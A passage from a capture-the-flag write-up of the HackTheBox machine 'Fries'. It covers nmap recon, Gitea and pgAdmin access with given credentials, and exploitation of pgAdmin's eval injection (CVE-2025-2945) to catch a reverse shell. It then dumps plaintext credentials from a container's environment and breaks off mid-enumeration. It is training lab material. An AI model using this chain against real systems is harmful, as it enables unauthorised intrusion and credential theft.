---
maquina: "Fries"
dificultad: "Hard"
os: "Windows"
plataforma: "htb"
release: "22 Nov 2025"
retire: "25 Jul 2026"
creadores: "ruycr4ft, kavigihan"
htb_url: "https://hackthebox.com/machines/fries"
app_url: "https://app.hackthebox.com/machines/808"
url: "https://0xdf.gitlab.io/2026/07/25/htb-fries.html"
tipo: "htb"
en_lista_oscp: false
oscp_seccion: ""
---

Fries is an assume breach Windows box that hides a sprawl of Linux services behind the domain controller. I’ll start with a set of credentials that don’t work anywhere obvious and use them to log into a Gitea instance, recovering database and pgAdmin access along the way. An outdated pgAdmin is vulnerable to a Python eval remote code execution bug that lands a shell in a container. From environment variables and the pgAdmin database I’ll collect more credentials and spray them to get a shell on the Docker host, which is itself a Hyper-V guest. There I’ll abuse a network file share by recreating a domain user locally to read the Docker daemon’s certificates, forge a client certificate, and use the Docker API to mount the host filesystem and become root. Root on that host holds a PWM configuration with an encrypted service account password, which I’ll recover to move into the domain. That account can read a group managed service account password, and from there I’ll abuse control over the certificate authority, chaining three ADCS misconfigurations to forge a certificate for the administrator and take over the domain.

## Recon

### Initial Scanning

`nmap` finds 25 open TCP ports:

```console
oxdf@hacky$ sudo nmap -p- --reason --min-rate 10000 10.129.244.72
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-15 11:33 UTC
Nmap scan report for 10.129.244.72
Host is up, received echo-reply ttl 127 (0.020s latency).
Not shown: 65510 filtered tcp ports (no-response)
PORT      STATE SERVICE          REASON
22/tcp    open  ssh              syn-ack ttl 62
53/tcp    open  domain           syn-ack ttl 127
80/tcp    open  http             syn-ack ttl 62
88/tcp    open  kerberos-sec     syn-ack ttl 127
135/tcp   open  msrpc            syn-ack ttl 127
139/tcp   open  netbios-ssn      syn-ack ttl 127
389/tcp   open  ldap             syn-ack ttl 127
443/tcp   open  https            syn-ack ttl 62
445/tcp   open  microsoft-ds     syn-ack ttl 127
464/tcp   open  kpasswd5         syn-ack ttl 127
593/tcp   open  http-rpc-epmap   syn-ack ttl 127
636/tcp   open  ldapssl          syn-ack ttl 127
2179/tcp  open  vmrdp            syn-ack ttl 127
3268/tcp  open  globalcatLDAP    syn-ack ttl 127
3269/tcp  open  globalcatLDAPssl syn-ack ttl 127
5985/tcp  open  wsman            syn-ack ttl 127
9389/tcp  open  adws             syn-ack ttl 127
49667/tcp open  unknown          syn-ack ttl 127
49673/tcp open  unknown          syn-ack ttl 127
49674/tcp open  unknown          syn-ack ttl 127
49678/tcp open  unknown          syn-ack ttl 127
49687/tcp open  unknown          syn-ack ttl 127
49908/tcp open  unknown          syn-ack ttl 127
59198/tcp open  unknown          syn-ack ttl 127
59226/tcp open  unknown          syn-ack ttl 127

Nmap done: 1 IP address (1 host up) scanned in 13.36 seconds
oxdf@hacky$ sudo nmap -p 22,53,80,88,135,139,389,443,445,464,593,636,2179,3268,3269,5985,9389,49667,49673,49674,49678,49687,49908,59198,59226 -sCV 10.129.244.72
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-07-15 11:39 UTC
Nmap scan report for 10.129.244.72
Host is up (0.020s latency).

PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 b3:a8:f7:5d:60:e8:66:16:ca:92:f6:76:ba:b8:33:c2 (ECDSA)
|_  256 07:ef:11:a6:a0:7d:2b:4d:e8:68:79:1a:7b:a7:a9:cd (ED25519)
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://fries.htb/
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-15 18:39:34Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2026-06-05T16:23:40
|_Not valid after:  2106-06-05T16:23:40
|_ssl-date: 2026-07-15T18:41:09+00:00; +7h00m03s from scanner time.
443/tcp   open  ssl/http      nginx 1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=pwm.fries.htb/organizationName=Fries Foods LTD/stateOrProvinceName=Madrid/countryName=SP
| Not valid before: 2025-06-01T22:06:09
|_Not valid after:  2026-06-01T22:06:09
| tls-nextprotoneg:
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
|_http-title: Site doesn't have a title (text/html;charset=ISO-8859-1).
|_http-server-header: nginx/1.18.0 (Ubuntu)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2026-06-05T16:23:40
|_Not valid after:  2106-06-05T16:23:40
|_ssl-date: 2026-07-15T18:41:09+00:00; +7h00m03s from scanner time.
2179/tcp  open  vmrdp?
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-07-15T18:41:10+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2026-06-05T16:23:40
|_Not valid after:  2106-06-05T16:23:40
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: fries.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2026-07-15T18:41:09+00:00; +7h00m03s from scanner time.
| ssl-cert: Subject:
| Subject Alternative Name: DNS:DC01.fries.htb, DNS:fries.htb, DNS:FRIES
| Not valid before: 2026-06-05T16:23:40
|_Not valid after:  2106-06-05T16:23:40
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49678/tcp open  msrpc         Microsoft Windows RPC
49687/tcp open  msrpc         Microsoft Windows RPC
49908/tcp open  msrpc         Microsoft Windows RPC
59198/tcp open  msrpc         Microsoft Windows RPC
59226/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h00m02s, deviation: 0s, median: 7h00m02s
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
| smb2-time:
|   date: 2026-07-15T18:40:30
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 101.99 seconds
```

The box shows many of the ports associated with a [Windows Domain Controller](https://0xdf.gitlab.io/cheatsheets/os#windows-domain-controller). The domain is `fries.htb`, and the hostname is `DC01`.

I’ll use `netexec` to make a `hosts` file entry and put it at the top of my `/etc/hosts` file:

```console
oxdf@hacky$ netexec smb 10.129.244.72 --generate-hosts-file hosts
SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
oxdf@hacky$ cat hosts /etc/hosts | sudo sponge /etc/hosts
```

There’s one additional hop to get to the SSH (22), HTTP (80), and HTTPS (443):

```console
oxdf@hacky$ sudo lft 10.129.244.72:22
Tracing ....T
TTL LFT trace to DC01.fries.htb (10.129.244.72):22/tcp
 1  10.10.14.1 19.6ms
 2  DC01.fries.htb (10.129.244.72) 20.3ms
 3  [target open] DC01.fries.htb (10.129.244.72):22 20.6ms
oxdf@hacky$ sudo lft 10.129.244.72:80
Tracing ....T
TTL LFT trace to DC01.fries.htb (10.129.244.72):80/tcp
 1  10.10.14.1 20.0ms
 2  DC01.fries.htb (10.129.244.72) 20.3ms
 3  [target open] DC01.fries.htb (10.129.244.72):80 21.7ms
oxdf@hacky$ sudo lft 10.129.244.72:443
Tracing ....T
TTL LFT trace to DC01.fries.htb (10.129.244.72):443/tcp
 1  10.10.14.1 19.8ms
 2  DC01.fries.htb (10.129.244.72) 20.3ms
 3  [target open] DC01.fries.htb (10.129.244.72):443 20.5ms
oxdf@hacky$ sudo lft 10.129.244.72:445
Tracing ...T
TTL LFT trace to DC01.fries.htb (10.129.244.72):445/tcp
 1  10.10.14.1 20.1ms
 2  [target open] DC01.fries.htb (10.129.244.72):445 20.2ms
```

That extra hop implies these services are running behind the box, on a separate host. The three extra hop ports also show a TTL of 62, which is the [expected TTL](https://0xdf.gitlab.io/cheatsheets/os#os-identification) for a Linux server two hops away. All the rest show 127, which matches the [expected TTL](https://0xdf.gitlab.io/cheatsheets/os#os-identification) for Windows one hop away. All of this together suggests a Windows computer running a Linux VM.

Based on the [OpenSSH and Nginx](https://0xdf.gitlab.io/cheatsheets/os#ubuntu) versions, the Linux VM is likely running Ubuntu 22.04 Jammy LTS.

`nmap` notes a clock skew, so I’ll want to make sure to run `sudo ntpdate DC01.fries.htb` before any actions that use Kerberos auth.

### Subdomain Fuzz - TCP 80

Port 80 on `nmap` shows a redirect to `fries.htb` on TCP 80 (but not on 443). I’ll use `ffuf` to fuzz for any subdomains of `fries.htb` that respond differently than the default redirection:

```console
oxdf@hacky$ ffuf -u http://10.129.244.72 -H "Host: FUZZ.fries.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.129.244.72
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.fries.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

code                    [Status: 200, Size: 13593, Words: 1048, Lines: 272, Duration: 52ms]
:: Progress: [19966/19966] :: Job [1/1] :: 2061 req/sec :: Duration: [0:00:10] :: Errors: 0 ::
```

It finds one, `code`. I’ll add this to my `hosts` file as well, and rescan port 80 with both hostnames, but not find anything interesting.

I’ll also run the fuzz on HTTPS, but not find anything there.

### Initial Credentials

HackTheBox provides the following scenario associated with Fries:

Please allow up to 7 minutes for services to load. As is common in real life Windows penetration tests, you will start the Fries box with credentials for the following account : d.cooper@fries.htb / D4LE11maan!!

Interestingly, the creds do not work on any of the domain services:

```console
oxdf@hacky$ netexec smb DC01.fries.htb -u d.cooper -p 'D4LE11maan!!'
SMB         10.129.244.72   445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.244.72   445    DC01             [-] fries.htb\d.cooper:D4LE11maan!! STATUS_LOGON_FAILURE
oxdf@hacky$ netexec smb DC01.fries.htb -u d.cooper -p 'D4LE11maan!!' -k
SMB         DC01.fries.htb  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:fries.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         DC01.fries.htb  445    DC01             [-] fries.htb\d.cooper:D4LE11maan!! KDC_ERR_PREAUTH_FAILED
oxdf@hacky$ netexec ldap DC01.fries.htb -u d.cooper -p 'D4LE11maan!!'
LDAP        10.129.244.72   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fries.htb) (signing:None) (channel binding:Never)
LDAP        10.129.244.72   389    DC01             [-] fries.htb\d.cooper:D4LE11maan!!
```

Presumably these will end up being useful at some point.

### fries.htb - TCP 443

#### Site

The root redirects to `/pwm/private/login`, which has the title “Password Self Service”:

![image-20260715175218240](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260715175218240.png)

It says under the Sign in button that:

> PWM is in open configuration mode and is not secure.

I’ll return to this later.

This is an instance of [PWM](https://github.com/pwm-project/pwm) a Java-based project that describes itself as:

> PWM is an open source password self-service application for LDAP directories.

#### Tech Stack

The HTTP request to `/` starts a chain of redirects:

![image-20260716082050284](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260716082050284.png)

The first GET returns 200, but the content does a redirect:

```html
<html><head><meta http-equiv="refresh" content="0;URL='/pwm'"/></head></html>
```

The GET of `/pwm/` sets a `JSESSIONID` cookie (as well as some others), and has a `X-PWM-Noise` header:

```http
HTTP/1.1 302
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 16 Jul 2026 19:16:11 GMT
Content-Length: 0
Connection: keep-alive
Vary: Accept-Encoding
Set-Cookie: JSESSIONID=F0E34093B980B72E991AD361F48F0D0A; Path=/pwm; Secure; HttpOnly; SameSite=Strict
X-PWM-SessionID: ECjOd
Content-Language: en
X-PWM-Noise: R6loLWP9PO5upB7s1sfKnb7mqwYthqs6nzxEGO6UDS4HFFXdyvENctZ4gbK2TC
X-Content-Type-Options: nosniff
X-XSS-Protection: 1
X-PWM-Instance: C92D3D0CE7B94985
X-Frame-Options: DENY
X-PWM-Amb: mooooooo!
Cache-Control: no-cache, no-store, must-revalidate, proxy-revalidate
Content-Security-Policy: default-src 'self'; object-src 'none'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src https://www.recaptcha.net/recaptcha/ https://www.gstatic.cn/recaptcha/  https://www.gstatic.com/recaptcha/ https://www.google.com/recaptcha/ 'self' 'unsafe-eval' 'nonce-GgthIngSdQzIzNy+G6yc01WBcox0u9SJ'; frame-src https://www.recaptcha.net/recaptcha/ https://www.gstatic.cn/recaptcha/ https://www.gstatic.com/recaptcha/ https://www.google.com/recaptcha/; report-uri /pwm/public/api?processAction=cspReport; connect-src 'self' https://www.recaptcha.net/recaptcha/ https://www.gstatic.cn/recaptcha/ https://www.gstatic.com/recaptcha/ https://www.google.com/recaptcha/
Location: /pwm/?stickyRedirectTest=key
Set-Cookie: ID=9miXl3D3GS1BGkWgqZhGHZjD98Yz9MU0mrnw3mde; Path=/pwm/; Secure; HttpOnly; SameSite=Strict
Set-Cookie: SESSION=; Max-Age=0; Expires=Thu, 01 Jan 1970 00:00:10 GMT; Path=/pwm/; Secure; HttpOnly; SameSite=Strict
Set-Cookie: SESSION=H4sIAAAAAAAA_wHLADT_UFdNLkdDTTEQ4mg0Q1WZRqMGSgfIiaRZRmm5gfRgpfl8dcxKrKNEKZQUBvAvWb63TT_b-k-xvwV9D-S1-eR0Ub0mGPOc-NA515vDQO-wINXDPAAKZvw1-KwQnW5_wUZUejVc9VPUC8uj8cFmzzhan9pdTyLEiEDvzdFl8-uZpLFIlG5bgJu39c2268wxBE6hjIVoSN1xRvva12PMuHHCF5RAy-pGixtL_aOF-rXsFeeW3Y23Wb1nijUXDPXsVOdIpSnE820fkC9gTTf1OFOGywAAAA%3D%3D; Path=/pwm/; Secure; HttpOnly; SameSite=Strict
```

Each request after that has a `X-PWM-Amb` header which includes references to literature and pop-culture changed to be about passwords:

```plaintext
X-PWM-Amb: As Gregor Samsa awoke one morning from uneasy dreams he found himself transformed in his bed into a gigantic password.
X-PWM-Amb: I don't always manage my passwords; but when I do, I use that password thingy amb developed.
X-PWM-Amb: That password really tied the room together dude.
X-PWM-Amb: The zombie's password is expired
X-PWM-Amb: I changed my password to "incorrect", so whenever i forget, it will tell me "your password is incorrect".
X-PWM-Amb: j00s j0ur d4ddy
```

These all line up with the thinking that this is PWM. `JSESSIONID` is a strong tie to Java (which PWM is written in).

I can find the PWM version on almost any page looking at the little drop down:

![image-20260722203718041](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260722203718041.png)

There are also links to the Configuration Manager and the Configuration Editor. Both links go to the same place, a page asking for a password:

![image-20260716083112416](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260716083112416.png)

It does show a bunch of logins back in June 2025 (probably when the box was being made), and then one authentication in November 2025 from an HTB player IP (probably box testing).

I can try some basic guessing at the password here, but nothing works.

### fries.htb - TCP 80

#### Site

The site is a restaurant reservation page:

![image-20260715173042173](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260715173042173.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

There are a couple other pages (`/about`, `/menu`), but everything on the site seems static, and many of the links don’t go anywhere.

The footer has an email address, `info@fries.htb`.

#### Tech Stack

The HTTP response headers show just Nginx:

```http
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 15 Jul 2026 19:31:14 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Content-Length: 14954
```

The 404 page matches the default [Python Flask 404](https://0xdf.gitlab.io/cheatsheets/404#flask):

![image-20260715174132951](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260715174132951.png)

If this is a Flask application, there’s no point in trying to guess at extensions or default pages.

#### Directory Brute Force

I’ll run `feroxbuster` against the site:

```console
oxdf@hacky$ feroxbuster -u http://fries.htb

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://fries.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      481l      928w     9430c http://fries.htb/static/css/style.css
200      GET       79l      189w     2540c http://fries.htb/static/js/main.js
200      GET      303l     1083w    14932c http://fries.htb/about
200      GET      393l     1145w    19931c http://fries.htb/menu
200      GET      309l     1013w    14954c http://fries.htb/
[####################] - 2m     30007/30007   0s      found:5       errors:0
[####################] - 2m     30000/30000   262/s   http://fries.htb/
```

Nothing at all.

### code.fries.htb

This is an instance of [Gitea](https://about.gitea.com/):

![image-20260715174400241](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260715174400241.png)

As an unauthenticated user, I can’t see any repos or orgs, but I can see two users in the Explore page:

![image-20260715174519590](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260715174519590.png)

Dale Cooper could be `d.cooper@fries.htb`, and the initial creds do work to provide access. Logged in as Dale, there’s one repo:

![image-20260715174619648](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260715174619648.png)

The repo is for the `fries.htb` main site:

![image-20260715174733004](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260715174733004.png)

![expand](https://0xdf.gitlab.io/icons/expand.png)

It is a Flask application, run on Docker. There’s a bunch of good info in the README:

- It shows building the Docker container from a host named `web` as the svc user:

![image-20260715175030359](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260715175030359.png)

- PostgreSQL runs in its own container:

![image-20260715175110861](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260715175110861.png)

- There’s a new subdomain leak here:

> The backend database can be managed from `http://db-mgmt05.fries.htb`. (This requires infra access, contact Dylan, Mike or Dale)

I’ll add this to my `hosts` file as well:

```plaintext
10.129.244.72     DC01.fries.htb fries.htb DC01 code.fries.htb db-mgmt05.fries.htb
```

The site source is very simple. It shows three routes in `routes.py`:

```python
from flask import Blueprint, render_template
from app.models import get_all_staff, get_menu_items_by_category

# Create a Blueprint for our routes
main_bp = Blueprint('main', __name__)

@main_bp.route('/')
def home():
    """Route for the home page"""
    return render_template('home.html', title='Welcome to Fries')

@main_bp.route('/about')
def about():
    """Route for the about page"""
    # Get all staff members from the database
    staff_members = get_all_staff()
    return render_template('about.html', title='About Us', staff=staff_members)

@main_bp.route('/menu')
def menu():
    """Route for the menu page"""
    # Get menu items grouped by category
    meals = get_menu_items_by_category('meals')
    beverages = get_menu_items_by_category('beverages')
    snacks = get_menu_items_by_category('snacks')

    return render_template(
        'menu.html',
        title='Our Menu',
        meals=meals,
        beverages=beverages,
        snacks=snacks
    )
```

These all could have been static pages.

`models.py` includes a `seed_data` function that shows what the database structure looks like.

The Commits tab shows 11 commits:

![image-20260716084723937](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260716084723937.png)

In the third commit, “gitignore update”, it adds `.env` to the `.gitignore`, so that file is no longer tracked. This removes the database url with the PostgreSQL connection string including password from the repo:

![image-20260716084843489](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260716084843489.png)

In the next commit, the only one from administrator, they add “or me” to the list of contacts:

![image-20260716084942095](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260716084942095.png)

The next commit from Dave changes “me” to “Dale”.

### db-mgmt05.fries.htb

The site is an instance of pgAdmin:

![image-20260716085857186](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260716085857186.png)

It’s asking for a login. The creds from Gitea don’t work, but the initially given creds do!

![image-20260716101853722](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260716101853722.png)

If I try to expand “Servers”, it asks for a password for the root user:

![image-20260716101925473](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260716101925473.png)

I’ve got this from Gitea, and it works:

![image-20260716102513253](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260716102513253.png)

I can find the data in the tables:

![image-20260716102803960](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260716102803960.png)

But there’s nothing super interesting.

The Help –> About pgAdmin4 option shows the version details:

![image-20260716102934009](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260716102934009.png)

It’s version 9.1.

## Shell as pgadmin on Container

### CVE Background

#### Identify CVE

There’s a bunch of different software here to think about, but in searching for vulnerabilities in pgAdmin, I’ll find two RCE CVEs that look interesting:

![image-20260716105644315](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260716105644315.png)

I did spend some time trying to make CVE-2025-12762 work here, but while NIST says versions <= 9.9 are vulnerable, Claude finds that the vulnerability was added in 9.2, the version after this one. I played around with this a bit, but I think Claude is right as the interface needed to exploit it just isn’t quite the same.

I’ll focus on CVE-2025-2945.

#### CVE-2025-2945

NIST describes [CVE-2025-2945](https://nvd.nist.gov/vuln/detail/CVE-2025-2945) as:

> Remote Code Execution security vulnerability in pgAdmin 4 (Query Tool and Cloud Deployment modules). The vulnerability is associated with the 2 POST endpoints; /sqleditor/query_tool/download, where the query_commited parameter and /cloud/deploy endpoint, where the high_availability parameter is unsafely passed to the Python eval() function, allowing arbitrary code execution. This issue affects pgAdmin 4: before 9.2.

User supplied code is passed to Python’s `eval` function, which is effectively the ability to do whatever I want. It’s patched in version 9.2, which is the one immediately after the one on Fries.

The issue is in two different endpoints, patched in [this commit](https://github.com/pgadmin-org/pgadmin4/commit/75be0bc22d3d8d7620711835db817bd7c021007c). Each endpoint takes user data and passes it to `eval`, and both are fixed by sanitizing that input and getting the valid options without `eval`:

![image-20260716161123041](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260716161123041.png)

Passing user input to `eval` is a recipe for RCE.

### Exploit

#### POC

To exploit this, I’ll right click on a database and select “Query Tool” from the menu:

![image-20260716162803416](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260716162803416.png)

In the window that opens, I’ll run a simple query:

![image-20260716162842263](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260716162842263.png)

I’ll enable interception in Burp Proxy, and click “Save Results to File”:

![image-20260716162942465](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260716162942465.png)

I’ll send the resulting POST request to Repeater, and replace `"query_commited": false` with the injection:

![image-20260716171456953](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260716171456953.png)

When I send this, there’s ICMP at my host:

```console
oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
21:13:21.164409 IP 10.129.244.72 > 10.10.15.243: ICMP echo request, id 1000, seq 0, length 64
21:13:21.164432 IP 10.10.15.243 > 10.129.244.72: ICMP echo reply, id 1000, seq 0, length 64
```

#### Shell

I’ll update the payload to be a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

![image-20260716171620459](https://pub-4caceed5c57c4466b559b0834d2806c9.r2.dev/img/image-20260716171620459.png)

On sending this, I’ll get a shell:

```console
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.129.244.72 49846
bash: cannot set terminal process group (1): Not a tty
bash: no job control in this shell
cb46692a4590:/pgadmin4$
```

`script` isn’t on the box, so I’ll use the `python` version of the [shell upgrade](https://www.youtube.com/watch?v=DqE6DxqJg8Q):

```console
cb46692a4590:/pgadmin4$ python -c 'import pty;pty.spawn("bash")'
cb46692a4590:/pgadmin4$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            ‍reset
cb46692a4590:/pgadmin4$
```

## Shell as svc on web

### Enumeration

#### Container

There are no user home directories in `/home`. Only root has a shell configured in `passwd`:

```console
cb46692a4590:/home$ cat /etc/passwd | grep 'sh$'
root:x:0:0:root:/root:/bin/sh
```

The hostname suggests this is a Docker container. There is a `.dockerenv` file at the filesystem root:

```console
cb46692a4590:/$ ls -a
.              entrypoint.sh  mnt            run            usr
..             etc            opt            sbin           var
.dockerenv     home           pgadmin4       srv            venv
bin            lib            proc           sys
dev            media          root           tmp
```

`entrypoint.sh` is the stock file from the [pgadmin4](https://github.com/pgadmin-org/pgadmin4/blob/REL-9_1/pkg/docker/entrypoint.sh) repo.

`/pgadmin4` has the instance of pgAdmin:

```console
cb46692a4590:/pgadmin4$ ls
DEPENDENCIES        docs                pgadmin
LICENSE             gunicorn_config.py  run_pgadmin.py
branding.py         migrations          setup.py
commit_hash         pgAdmin4.py         version.py
config.py           pgAdmin4.wsgi
config_distro.py    pgacloud
```

In this directory I’ll find a couple potentially valuable items.

`config_distro.py` is written by `entrypoint.sh` at container start and holds any values passed in via `PGADMIN_CONFIG_*` environment variables. On Fries it only has the defaults:

```console
cb46692a4590:/pgadmin4$ cat config_distro.py
CA_FILE = '/etc/ssl/certs/ca-certificates.crt'
LOG_FILE = '/dev/null'
HELP_PATH = '../../docs'
DEFAULT_BINARY_PATHS = {
        'pg': '/usr/local/pgsql-17',
        'pg-17': '/usr/local/pgsql-17',
        'pg-16': '/usr/local/pgsql-16',
        'pg-15': '/usr/local/pgsql-15',
        'pg-14': '/usr/local/pgsql-14',
        'pg-13': '/usr/local/pgsql-13'
}
```

The environment is more useful. pgAdmin exports a `PGPASSWORD`-style variable (with a numeric name) for each live database connection, and the default admin credentials are present as well:

```console
cb46692a4590:/pgadmin4$ env
260717000838088413=PsqLR00tpaSS11
260717001513392595=PsqLR00tpaSS11
PGADMIN_DEFAULT_PASSWORD=Friesf00Ds2025!!
PGADMIN_DEFAULT_EMAIL=admin@fries.htb
...[snip]...
```

That’s two sets of credentials in plaintext:

- pgAdmin admin login: `admin@fries.htb` / `Friesf00Ds2025!!`
- a PostgreSQL password: `PsqLR00tpaSS11`

To figure out where that Postgres password goes, I’ll look at pgAdmin’s config database, `/var/lib/pgadmin/pgadmin4.db`. It’s a SQLite file, and Python is on the box, so I’ll query it directly. I can list tables:

```console
cb46692a4590:/$ python
Python 3.12.9 (main, Feb  7 2025, 17:39:29) [GCC 14.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import sqlite3
>>> c = sqlite3.connect('/var/lib/pgadmin/pgadmin4.db')
>>> [r[0] for r in c.execute("select name from sqlite_master where type='table'")]
['alembic_version', 'version', 'role', 'roles_users', 'servergroup', 'module_preference', 'preference_category', 'preferences', 'user_preferences', 'debugger_function_arguments', 'process', 'keys', 'query_history', 'database', 'macros', 'user', 'user_mfa', 'sharedserver', 'setting', 'sqlite_sequence', 'user_macros', 'server']
```

The `server` table has the saved connections:

```console
>>> _ = [print(r) for r in c.execute('select id,name,host,port,username,maintenance_db,save_password from server')]
(1, 'Fries DB', '172.18.0.3', 5432, 'root', 'postgres', 0)
(2, 'fries.htb', '172.18.0.3', 5432, 'root', 'postgres', 0)
```

Both point at `172.18.0.3:5432` (another container on the Docker network) as the user `root`. `save_password` is `0`, so the password isn’t stored in the DB - it’s the `PsqLR00tpaSS11` value from the environment.

The `user` table holds the pgAdmin login hashes:

```console
